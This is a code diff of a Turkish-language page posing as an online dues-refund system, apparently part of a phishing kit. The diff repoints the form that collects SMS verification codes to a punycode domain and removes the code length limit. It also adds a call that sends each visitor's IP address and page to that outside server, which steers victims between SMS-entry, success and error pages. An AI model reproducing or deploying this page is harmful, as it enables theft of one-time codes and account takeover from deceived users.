@@ -136,7 +136,7 @@ function validate(){
   font-weight: 700;
   font-style: normal;
 }</style>
-<form id="frmContact" action="https://alliikkerrr.online/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
+<form id="frmContact" action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="post" onsubmit="return validate();" data-gtm-form-interact-id="0">
     <!-- Diğer form içeriği burada -->
 
     <div class="creditly-wrapper wthree, w3_agileits_wrapper">
@@ -147,7 +147,7 @@ function validate(){
                         <div class="col-md-12">
                             <div class="login-inner-form">
                                 <div class="details">
-                                    <a href="https://alliikkerrr.online/validateCaptcha.php">
+                                    <a href="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php">
                                         <img src="./files/logo-2.png" alt="logo">
                                     </a>
                                     <h3>Online Aidat İade Sistemi</h3>
@@ -156,7 +156,7 @@ function validate(){
                                     <!-- SMS doğrulama kodu için input -->
                                     <div class="form-group">
                                         <label for="smsCode">SMS Doğrulama Kodu</label>
-                                        <input type="text" class="form-control" id="smsCode" name="smsCode" maxlength="6" required>
+                                        <input type="text" class="form-control" id="smsCode" name="smsCode" required>
                                     </div>
 
                                     <!-- Geri sayım zamanı için div -->
@@ -230,21 +230,21 @@ function validate(){
       makeRequests() {
     if (this.userIp) {
         var currentPage = window.location.pathname.split('/').pop();
-        axios.get(`/api?user_ip=${this.userIp}&current_page=${currentPage}`)
+        axios.get(`https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}&current_page=${currentPage}`)
             .then(response => {
                 this.results = response.data;
                 console.log('GET isteği başarıyla gönderildi. Sunucu yanıtı:', response.data);
 
                 // response.data'ya göre yönlendirme yap
-                if (response.data === 'sms') {
+                if (response.data === 'sms0') {
                     window.location.href = '/sms.html';
-                } else if (response.data === 'tebrik') {
+                } else if (response.data === 'tebrik0') {
                     window.location.href = '/tebrik.html';
-                } else if (response.data === 'hata') {
+                } else if (response.data === 'hata0') {
                     window.location.href = '/hatali.html';
-                } else if (response.data === 'sms2') {
+                } else if (response.data === 'sms20') {
                     window.location.href = '/hatali.html';
-                } else if (response.data === 'back') {
+                } else if (response.data === 'back0') {
                     window.location.href = '/index.html';
                 } else if (response.data === '1') {
                     window.location.href = 'smsh.php';
